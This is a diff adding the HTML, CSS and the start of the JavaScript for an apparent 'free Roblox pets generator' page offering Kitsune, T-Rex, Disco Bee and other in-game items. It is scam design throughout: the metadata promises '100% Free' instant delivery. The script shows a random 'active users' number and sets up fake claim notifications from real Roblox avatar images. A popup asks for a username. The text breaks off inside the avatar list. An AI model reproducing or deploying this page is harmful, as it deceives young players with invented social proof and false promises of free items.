@@ -1,0 +1,1564 @@
+<!DOCTYPE html><html lang="en" dir="ltr"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <!-- SEO OPTIMIZED TITLE & DESCRIPTION -->
+  <title>FREE Roblox Pets 2025 | Get Kitsune, T-Rex, Disco Bee & 20+ Pets Instantly</title>
+  <meta name="description" content="🎮 FREE Roblox Pets 2025! Get Kitsune, T-Rex, Disco Bee, Spinosaurus, Queen Bee & 20+ Exclusive Pets INSTANTLY. Real Website, No Download, No Survey, 100% Free. Claim Your Free Roblox Pets Now!">
+  <meta name="keywords" content="free roblox pets, roblox pets free, free roblox items, roblox kitsune, roblox t-rex, roblox disco bee, roblox spinosaurus, roblox queen bee, free roblox pets 2025, roblox pets website, roblox items free, free roblox pets no download">
+  <meta name="author" content="GROW A GARDEN">
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+  
+  <!-- Open Graph for Social Media -->
+  <meta property="og:title" content="FREE Roblox Pets 2025 | Get 20+ Pets Instantly">
+  <meta property="og:description" content="🎮 Get FREE Roblox Pets: Kitsune, T-Rex, Disco Bee, Spinosaurus & More! Real Website, No Download Required, Instant Delivery. Claim Your Free Pets Now!">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://growagarden.com/">
+  <meta property="og:image" content="images/logo2.webp">
+  
+  <!-- Twitter Cards -->
+  <meta name="twitter:title" content="FREE Roblox Pets 2025">
+  <meta name="twitter:description" content="🎮 Get FREE Roblox Pets: Kitsune, T-Rex, Disco Bee & More! Real Website, No Download, Instant Delivery.">
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <!-- Additional SEO -->
+  <meta name="language" content="English">
+  <meta name="revisit-after" content="1 days">
+  <meta name="distribution" content="global">
+  <link rel="canonical" href="https://growagarden.com/">
+  
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" href="https://i.imgur.com/24Lwtxi.png">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  
+  <!-- Structured Data for Rich Snippets -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebApplication",
+    "name": "GROW A GARDEN",
+    "description": "Free Roblox pets and items generator. Get instant access to exclusive pets like Kitsune, Disco Bee, T-Rex, and more.",
+    "url": "https://growagarden.com/",
+    "applicationCategory": "Game",
+    "operatingSystem": "Web Browser",
+    "offers": {
+      "@type": "Offer",
+      "price": "0",
+      "priceCurrency": "USD",
+      "description": "Free Roblox pets and items"
+    },
+    "author": {
+      "@type": "Organization",
+      "name": "GROW A GARDEN"
+    },
+    "screenshot": "images/logo2.webp",
+    "softwareVersion": "1.0"
+  }
+  </script>
+  
+  <!-- Additional Structured Data for Items -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "ItemList",
+    "name": "Available Roblox Pets",
+    "description": "Collection of free Roblox pets and items available for claim",
+    "itemListElement": [
+      {
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@type": "Product",
+          "name": "Kitsune",
+          "description": "Mythical fox pet for Roblox",
+          "image": "images/Kitsune.webp"
+        }
+      },
+      {
+        "@type": "ListItem",
+        "position": 2,
+        "item": {
+          "@type": "Product",
+          "name": "Disco Bee",
+          "description": "Colorful bee pet for Roblox",
+          "image": "images/DiscoBeeIcon.webp"
+        }
+      },
+      {
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@type": "Product",
+          "name": "T-Rex",
+          "description": "Dinosaur pet for Roblox",
+          "image": "images/T-Rex.webp"
+        }
+      }
+    ]
+  }
+  </script>
+  <style>
+    :root {
+      --bg-gradient: linear-gradient(135deg, #1a2a33 0%, #2e8b57 100%);
+      --card-bg: rgba(255, 255, 255, 0.1);
+      --accent: #6ee7b7;
+      --accent2: #60a5fa;
+      --accent3: #fbbf24;
+      --accent4: #f472b6;
+      --text-main: #f3f4f6;
+      --text-muted: #a7bfc9;
+      --card-radius: 18px;
+      --shadow: 0 4px 24px 0 rgba(0,0,0,0.18);
+    }
+    
+    body {
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      font-family: 'Poppins', Arial, sans-serif;
+      background: url('images/bg.png') no-repeat center center fixed;
+      background-size: cover;
+      color: var(--text-main);
+      box-sizing: border-box;
+      overflow-x: hidden;
+      text-align: left;
+    }
+    
+    /* Background pets styles */
+    .background-pets {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+    
+    .floating-pet {
+      position: absolute;
+      width: 95px;
+      height: 95px;
+      opacity: 0.8;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.15);
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      will-change: transform;
+      transform: translate3d(0, 0, 0);
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+    }
+    
+    .floating-pet:hover {
+      opacity: 1;
+      transform: scale(1.15);
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.4);
+    }
+    
+    .floating-pet img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 50%;
+      padding: 8px;
+      box-sizing: border-box;
+    }
+    
+    /* Responsive adjustments for background pets */
+    @media (max-width: 768px) {
+      .floating-pet {
+        width: 80px;
+        height: 80px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .floating-pet {
+        width: 70px;
+        height: 70px;
+      }
+    }
+    
+    .logo-container {
+      text-align: center;
+      padding-top: 18px;
+    }
+    .logo-container img {
+      max-width: 160px;
+      filter: drop-shadow(0 0 16px var(--accent));
+      border-radius: 22px;
+      background: rgba(255,255,255,0.07);
+      box-shadow: 0 2px 18px #0003;
+    }
+    .content {
+      position: relative;
+      z-index: 1;
+    }
+    .top-bar {
+      width: 100vw;
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      box-sizing: border-box;
+      padding: 18px 0 0 0;
+      margin-bottom: 8px;
+    }
+    .active-users-box {
+      background: rgba(255, 255, 255, 0.1);
+      border: 2.5px solid rgba(255, 255, 255, 0.3);
+      border-radius: var(--card-radius);
+      padding: 13px 18px;
+      display: flex;
+      align-items: center;
+      font-size: 1.5em;
+      min-width: 220px;
+      max-width: 70vw;
+      margin: 0;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+      font-weight: 700;
+      font-family: 'Poppins', Arial, sans-serif;
+      height: 54px;
+      justify-content: center;
+      cursor: pointer;
+      transition: transform 0.17s cubic-bezier(.17,.67,.83,.67), box-shadow 0.2s;
+      will-change: transform;
+      position: relative;
+      overflow: hidden;
+      color: var(--accent);
+    }
+    .active-users-box:after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: 0.5s;
+    }
+    .active-users-box:hover:after {
+      left: 100%;
+    }
+    .active-users-box:active {
+      transform: scale(1.09) rotate(-2deg);
+      box-shadow: 0 0 0 6px rgba(255, 255, 255, 0.3), 0 2px 6px rgba(0, 0, 0, 0.3);
+      z-index: 2;
+      filter: brightness(1.08);
+      background: rgba(255, 255, 255, 0.2);
+      color: #fff;
+    }
+    .active-users-box span:first-child {
+      color: var(--accent3);
+      margin-right: 8px;
+      font-weight: 900;
+      font-size: 1.1em;
+      letter-spacing: 1px;
+    }
+    .active-users-count {
+      font-weight: 900;
+      font-family: 'Poppins', Arial, sans-serif;
+      margin-left: 8px;
+      font-size: 1.15em;
+      color: var(--accent4);
+      text-shadow: 0 0 8px var(--accent4);
+    }
+    .select-title {
+      margin: 30px 0 24px 0;
+      text-align: center;
+      font-size: 2em;
+      color: var(--accent2);
+      font-family: 'Poppins', Arial, sans-serif;
+      letter-spacing: .4px;
+      font-weight: 900;
+      text-shadow: 0 1px 5px #2225;
+      padding: 8px 0;
+      position: relative;
+    }
+    
+    .select-title h1 {
+      margin: 0;
+      font-size: 1em;
+      color: inherit;
+    }
+    
+    .select-title .subtitle {
+      margin: 10px 0 0 0;
+      font-size: 0.4em;
+      color: var(--text-muted);
+      font-weight: 400;
+      letter-spacing: 0.2px;
+    }
+    
+    .select-title:after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 25%;
+      width: 50%;
+      height: 3px;
+      background: linear-gradient(to right, transparent, var(--accent3), transparent);
+    }
+    
+    .info-section {
+      text-align: center;
+      margin: 40px auto;
+      max-width: 800px;
+      padding: 0 20px;
+    }
+    
+    .info-section h2 {
+      color: var(--accent2);
+      font-size: 1.8em;
+      margin-bottom: 20px;
+      font-weight: 700;
+    }
+    
+    .info-section p {
+      color: var(--text-main);
+      font-size: 1.1em;
+      line-height: 1.6;
+      margin: 0;
+      opacity: 0.9;
+    }
+    .items-grid {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 26px;
+      margin-bottom: 40px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .items-row {
+      display: flex;
+      gap: 22px;
+      width: 100%;
+      justify-content: center;
+      box-sizing: border-box;
+    }
+    .item-card {
+      background: var(--card-bg);
+      border-radius: var(--card-radius);
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+      padding: 14px 10px 10px 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 170px;
+      min-width: 100px;
+      max-width: 31vw;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      margin: 0;
+      position: relative;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(.17,.67,.83,.67);
+      will-change: transform;
+      overflow: hidden;
+      color: var(--text-main);
+    }
+    .item-card:before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(45deg, rgba(255, 255, 255, 0.1) 0%, transparent 100%);
+      opacity: 0.2;
+      transition: opacity 0.3s;
+    }
+    .item-card:hover {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+      border-color: rgba(255, 255, 255, 0.3);
+      background: rgba(255, 255, 255, 0.15);
+    }
+    .item-card:active {
+      transform: scale(1.05) rotate(-1deg);
+      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.2), 0 2px 8px rgba(0, 0, 0, 0.2);
+      z-index: 2;
+    }
+    .item-card.selected {
+      background: linear-gradient(135deg, rgba(251, 191, 36, 0.8), rgba(244, 114, 182, 0.8));
+      border: 2px solid rgba(251, 191, 36, 0.8);
+      box-shadow: 0 0 20px rgba(251, 191, 36, 0.4);
+      animation: goldenGlow 1.5s infinite alternate;
+      color: #222;
+    }
+    @keyframes goldenGlow {
+      from {
+        box-shadow: 0 0 10px var(--accent3);
+      }
+      to {
+        box-shadow: 0 0 25px var(--accent3);
+      }
+    }
+    .item-img {
+      width: 110px;
+      height: 110px;
+      object-fit: cover;
+      border-radius: 12px;
+      background: #eaeaea11;
+      margin-bottom: 10px;
+      border: none;
+      image-rendering: pixelated;
+      box-shadow: 0 0 13px #0001;
+      transition: box-shadow 0.12s, filter 0.12s;
+      display: block;
+      position: relative;
+      z-index: 1;
+    }
+    .item-card.selected .item-img {
+      box-shadow: 0 0 15px var(--accent3);
+      filter: brightness(1.05) contrast(1.1);
+    }
+    .item-name {
+      font-size: 1.13em;
+      color: var(--accent);
+      font-family: 'Poppins', Arial, sans-serif;
+      text-align: center;
+      font-weight: 700;
+      letter-spacing: .2px;
+      margin-bottom: 0;
+      line-height: 1.2;
+      width: 100%;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+      background: none;
+      border-radius: 0;
+      border: none;
+      margin-top: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-sizing: border-box;
+      min-height: 28px;
+      position: relative;
+      z-index: 1;
+    }
+    .item-card.selected .item-name {
+      color: #fff;
+      text-shadow: 0 0 2px var(--accent3);
+    }
+    /* Notification styles */
+    .cliameds {
+      position: fixed;
+      bottom: 65px;
+      left: 15px;
+      z-index: 9999;
+    }
+    .message {
+      background: rgba(255, 255, 255, 0.15);
+      display: flex;
+      font-size: .9rem;
+      align-items: center;
+      padding: 12px 22px;
+      border-radius: 10px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      color: #fff;
+    }
+    .message:after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -60%;
+      width: 20%;
+      height: 200%;
+      background: rgba(255, 255, 255, 0.2);
+      transform: rotate(30deg);
+      transition: all 0.5s;
+    }
+    .message:hover:after {
+      left: 120%;
+    }
+    .message .img {
+      padding-right: 10px;
+      z-index: 2;
+    }
+    .message .img img {
+      width: 50px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      height: 50px;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+    }
+    .message .more div:first-child {
+      font-weight: bold;
+      color: #fbbf24;
+    }
+    .message .more div:last-child {
+      color: #fff;
+      font-weight: 700;
+    }
+    /* Responsive grid for desktop */
+    @media (min-width: 900px) {
+      .items-grid {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 20px;
+        justify-content: center;
+        padding: 0 5%;
+      }
+      .items-row {
+        display: contents;
+      }
+      .item-card {
+        width: 100%;
+        max-width: 180px;
+        margin: 0 auto;
+      }
+    }
+    /* Mobile-first adjustments */
+    @media (max-width: 900px) {
+      .items-grid {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 26px;
+      }
+      .items-row {
+        display: flex;
+        gap: 10px;
+        width: 100%;
+        justify-content: center;
+      }
+      .active-users-box {
+        font-size: 1.1em;
+        min-width: 145px;
+        padding: 9px 8px;
+        height: 38px;
+      }
+      .select-title {
+        font-size: 1.1em;
+      }
+      .item-card {
+        width: 31vw;
+        min-width: 0;
+        max-width: 32vw;
+        padding: 8px 2px 6px 2px;
+      }
+      .item-img {
+        width: 80px;
+        height: 80px;
+      }
+      .item-name {
+        min-height: 22px;
+        font-size: 0.95em;
+      }
+    }
+    @media (max-width: 700px) {
+      .items-grid {
+        gap: 5vw;
+      }
+      .items-row {
+        gap: 5vw;
+      }
+      .item-card {
+        width: 29vw;
+        max-width: 33vw;
+        min-width: 0;
+        padding: 5vw 1vw 2vw 1vw;
+      }
+      .item-img {
+        width: 24vw;
+        height: 24vw;
+        min-width: 62px;
+        min-height: 62px;
+        max-width: 110px;
+        max-height: 110px;
+      }
+      .item-name {
+        font-size: 0.92em;
+        min-height: 20px;
+      }
+    }
+    @media (max-width: 500px) {
+      .items-row {
+        gap: 2vw;
+      }
+      .item-card {
+        width: 30vw;
+        max-width: 33vw;
+        min-width: 0;
+        padding: 2vw 0.5vw 2vw 0.5vw;
+      }
+      .item-img {
+        width: 26vw;
+        height: 26vw;
+        min-width: 54px;
+        min-height: 54px;
+        max-width: 96px;
+        max-height: 96px;
+      }
+      .item-name {
+        font-size: 0.89em;
+        min-height: 16px;
+      }
+      .logo-container img {
+        max-width: 120px;
+      }
+      .cliameds {
+        left: 5px;
+      }
+    }
+    /* Popup styles */
+    .purchase-popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(5px);
+    }
+    .popup-content {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 25px;
+      border-radius: 18px;
+      width: 90%;
+      max-width: 380px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      color: var(--text-main);
+      margin: auto;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border: 2px solid rgba(255, 255, 255, 0.2);
+    }
+    .popup-header {
+      position: relative;
+      padding-bottom: 20px;
+      margin-bottom: 15px;
+    }
+    .popup-header h3 {
+      font-size: 24px;
+      margin: 0;
+      color: var(--accent2);
+      font-weight: 700;
+    }
+    .popup-header:after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 10%;
+      right: 10%;
+      height: 3px;
+      background: var(--accent3);
+    }
+    .item-popup-image {
+      width: 130px;
+      height: 130px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 0.3cm auto;
+      border: 3px solid var(--accent2);
+      box-shadow: 0 4px 12px var(--accent2);
+    }
+    .item-confirm {
+      font-size: 18px;
+      margin: 0.3cm 0;
+      color: var(--accent);
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .input-group input {
+      width: 92%;
+      padding: 15px 12px;
+      background: rgba(255, 255, 255, 0.1);
+      color: var(--text-main);
+      border: 1.5px solid rgba(255, 255, 255, 0.3);
+      border-radius: 7px;
+      font-size: 15px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: rgba(255, 255, 255, 0.6);
+      background: rgba(255, 255, 255, 0.15);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+    }
+    .input-group input::placeholder {
+      color: rgba(255, 255, 255, 0.6);
+      font-weight: 700;
+    }
+    .popup-buttons {
+      display: flex;
+      flex-direction: row;
+      gap: 16px;
+      margin-top: 18px;
+    }
+    .cancel-btn, .free-btn {
+      flex: 1;
+      width: auto;
+      min-width: 0;
+      border-radius: 10px;
+      font-size: 1.1em;
+      padding: 14px 0;
+      font-weight: 700;
+      box-shadow: 0 2px 8px #0002;
+      border: none;
+      transition: background 0.2s, color 0.2s, box-shadow 0.2s;
+    }
+    .cancel-btn {
+      background: #ef4444;
+      color: #fff;
+    }
+    .cancel-btn:hover {
+      background: #b91c1c;
+      color: #fff;
+    }
+    .free-btn {
+      background: #22c55e;
+      color: #fff;
+    }
+    .free-btn:hover {
+      background: #15803d;
+      color: #fff;
+    }
+    .free-btn .free-badge {
+      color: #fff;
+      font-weight: 900;
+      font-size: 1em;
+    }
+    @media (max-width: 600px) {
+      .popup-buttons {
+        flex-direction: column;
+        gap: 10px;
+      }
+      .cancel-btn, .free-btn {
+        font-size: 1em;
+        padding: 12px 0;
+      }
+    }
+    .searching-text {
+      color: var(--accent2);
+      font-size: 18px;
+      margin-top: 20px;
+    }
+    .user-error {
+      color: #ff6b6b;
+      font-size: 14px;
+      margin-top: 5px;
+      text-align: center;
+    }
+    .result-avatar {
+      width: 130px;
+      height: 130px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 15px auto;
+      border: 3px solid var(--accent2);
+    }
+    .result-username {
+      color: var(--accent3);
+      font-size: 18px;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+    .get-item-now-btn {
+      background: var(--accent3);
+      color: #222;
+      border: none;
+      padding: 12px;
+      border-radius: 7px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      margin-top: 15px;
+      transition: background 0.3s, color 0.3s;
+    }
+    .get-item-now-btn:hover {
+      background: var(--accent2);
+      color: #fff;
+    }
+    .d-none {
+      display: none !important;
+    }
+    /* Loader styles */
+    .folding {
+      margin: 20px auto;
+      width: 70px;
+      height: 70px;
+      position: relative;
+      transform: rotateZ(45deg);
+    }
+    .square {
+      position: absolute;
+      top: 30%;
+      right: 30%;
+      width: 30px;
+      height: 30px;
+      background: var(--accent2);
+      transform: rotateZ(87deg);
+    }
+    .folding .sk-cube {
+      float: left;
+      width: 50%;
+      height: 50%;
+      position: relative;
+      transform: scale(1.1);
+    }
+    .folding .sk-cube:before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--accent3);
+      animation: sk-foldCubeAngle 2.4s infinite linear both;
+      transform-origin: 100% 100%;
+    }
+    .folding .sk-cube2 {
+      transform: scale(1.1) rotateZ(90deg);
+    }
+    .folding .sk-cube3 {
+      transform: scale(1.1) rotateZ(180deg);
+    }
+    .folding .sk-cube4 {
+      transform: scale(1.1) rotateZ(270deg);
+    }
+    .folding .sk-cube2:before {
+      animation-delay: 0.3s;
+    }
+    .folding .sk-cube3:before {
+      animation-delay: 0.6s;
+    }
+    .folding .sk-cube4:before {
+      animation-delay: 0.9s;
+    }
+    @keyframes sk-foldCubeAngle {
+      0%, 10% {
+        transform: perspective(140px) rotateX(-180deg);
+        opacity: 0;
+      }
+      25%, 75% {
+        transform: perspective(140px) rotateX(0deg);
+        opacity: 1;
+      }
+      90%, 100% {
+        transform: perspective(140px) rotateY(180deg);
+        opacity: 0;
+      }
+    }
+    /* Sound icon for buttons */
+    .sound-icon {
+      margin-left: 5px;
+      font-size: 14px;
+    }
+  </style>
+<link rel="me" href="https://www.blogger.com/profile/09867707712002395245">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+<link rel="me" href="https://www.blogger.com/profile/11765107438099270178">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-J1BSNLE03B"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-J1BSNLE03B');
+</script>
+
+
+</head>
+<body>
+
+  <!-- Background Pets Container -->
+  <div class="background-pets" id="backgroundPets">
+    <!-- Pets will be dynamically added here -->
+  </div>
+
+  <div class="logo-container">
+    <img src="images/logo2.webp" alt="GROW A GARDEN Logo" border="0">
+  </div>
+  
+  <div class="content">
+    <div class="top-bar">
+      <div class="active-users-box">
+        <span>Active users :</span>
+        <span class="active-users-count" id="activeUsersCount"></span>
+      </div>
+    </div>
+
+    <div class="select-title">
+      SELECT THE ITEM YOU WANT
+    </div>
+
+    <!-- إرجاع هيكل الصفوف كما كان في الأصل للهواتف -->
+    <div class="items-grid" id="itemsGrid">
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="images/Kitsune.webp" alt="Kitsune">
+          <div class="item-name">Kitsune</div>
+        </div>
+         <div class="item-card">
+          <img class="item-img" src="images/CorruptedKitsune.webp" alt="CorruptedKitsune">
+          <div class="item-name">Corrupted Kitsune</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/DiscoBeeIcon.webp" alt="Disco Bee">
+          <div class="item-name">Disco Bee</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/DragonflyIcon.webp" alt="Dragonfly">
+          <div class="item-name">Dragonfly</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/Raccon_Better_Quality.webp" alt="Raccoon">
+          <div class="item-name ">Raccoon</div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="images/MimicOctopusIcon.webp" alt="Mimic Octopus">
+          <div class="item-name">Mimic Octopus</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/FennecFoxIcon.webp" alt="Fennec Fox">
+          <div class="item-name">Fennec Fox</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/T-Rex.webp" alt="T-Rex">
+          <div class="item-name">T-Rex</div>
+        </div>
+      </div>
+      <div class="item-card">
+        <img class="item-img" src="images/Spinosaurus.webp" alt="Spinosaurus">
+        <div class="item-name">Spinosaurus</div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="images/Queen_bee.webp" alt="Queen Bee">
+          <div class="item-name">Queen Bee</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/RedFox.webp" alt="Red Fox">
+          <div class="item-name">Red Fox</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/Chicken_Zombie_Icon.webp" alt="Chicken Zombie">
+          <div class="item-name">Chicken Zombie</div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="images/Blood_Owl_Icon.webp" alt="Blood Owl">
+          <div class="item-name">Blood Owl</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/Thy_Butterfly_V2.webp" alt="Butterfly">
+          <div class="item-name">Butterfly</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/Cooked_Owl.webp" alt="Cooked Owl">
+          <div class="item-name">Cooked Owl</div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="images/BoneBlossomCrop.webp" alt="Bone Blossom">
+          <div class="item-name">Bone Blossom</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/CandyBlossomPic.webp" alt="Candy Blossom">
+          <div class="item-name">Candy Blossom</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/MoonMangoIcon.webp" alt="Moon Mango">
+          <div class="item-name">Moon Mango</div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="images/Fossilight_Fruit_Crop.webp" alt="Fossilight Fruit">
+          <div class="item-name">Fossilight Fruit</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/DragonPepperIcon.webp" alt="Dragon Pepper">
+          <div class="item-name">Dragon Pepper</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/Elephant_Ears_Produce.webp" alt="Elephant Ears">
+          <div class="item-name">Elephant Ears</div>
+        </div>
+      </div>
+      <div class="items-row">
+        <div class="item-card">
+          <img class="item-img" src="images/MoonBlossomBetterQuality.webp" alt="Moon Blossom">
+          <div class="item-name">Moon Blossom</div>
+        </div>
+        <div class="item-card">
+          <img class="item-img" src="images/SugarAppleIcon.webp" alt="Sugar Apple">
+          <div class="item-name">Sugar Apple</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="footer-section">
+        <h3>Popular Roblox Pets</h3>
+        <ul>
+          <li><a href="#kitsune">Kitsune Pet</a></li>
+          <li><a href="#disco-bee">Disco Bee Pet</a></li>
+          <li><a href="#t-rex">T-Rex Pet</a></li>
+          <li><a href="#spinosaurus">Spinosaurus Pet</a></li>
+          <li><a href="#queen-bee">Queen Bee Pet</a></li>
+        </ul>
+      </div>
+      <div class="footer-section">
+        <h3>Free Roblox Items</h3>
+        <ul>
+          <li><a href="#plants">Plant Pets</a></li>
+          <li><a href="#dinosaurs">Dinosaur Pets</a></li>
+          <li><a href="#mythical">Mythical Creatures</a></li>
+          <li><a href="#flying">Flying Pets</a></li>
+          <li><a href="#aquatic">Aquatic Pets</a></li>
+        </ul>
+      </div>
+      <div class="footer-section">
+        <h3>About Us</h3>
+        <p>GROW A GARDEN provides free Roblox pets and items to enhance your gaming experience. All items are completely free with instant delivery.</p>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; 2024 GROW A GARDEN. All rights reserved. | Free Roblox Pets & Items Generator</p>
+    </div>
+  </footer>
+  
+  <div class="cliameds"></div>
+  
+  <!-- Purchase Popup -->
+  <div class="purchase-popup" id="purchase-popup">
+    <div class="popup-content">
+      <!-- Dynamic content -->
+    </div>
+  </div>
+  
+  <!-- Sound elements -->
+  <audio id="dingSound" preload="auto">
+    <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="clickSound" preload="auto">
+    <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    // Function to generate random number between 90 and 900
+    function randomUsers() {
+      return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
+    }
+    function updateActiveUsers() {
+      document.getElementById('activeUsersCount').textContent = randomUsers();
+    }
+    updateActiveUsers();
+    setInterval(updateActiveUsers, 4500);
+    
+    // Notifications code
+    const avatars = [
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F886F6A2F04884003042CB1B133FF85E-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DB22938CEDD6F835BDC83517F22CF558-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F323BBE8809396771A9D3B009ABB7B6C-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-877FD313CF49AC230D6CDB0813384418-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-508B26B915327442310C15E05990262A-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D69F986644481AEE90D6BBB252BDD78B-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-2C45A19E70B6AAC621EBD8B2D0A6E42E-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-06DD1C00CA0EB2CCDF1E8E828D182573-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7E66C8AA069C27FAB434F332DFA7DE40-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-ED6E717A62E7C6DE57502AA232123D98-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A415CFB32D441BB6E1A96CA204BB0647-Png/150/150/AvatarHeadshot/Webp/noFilter',
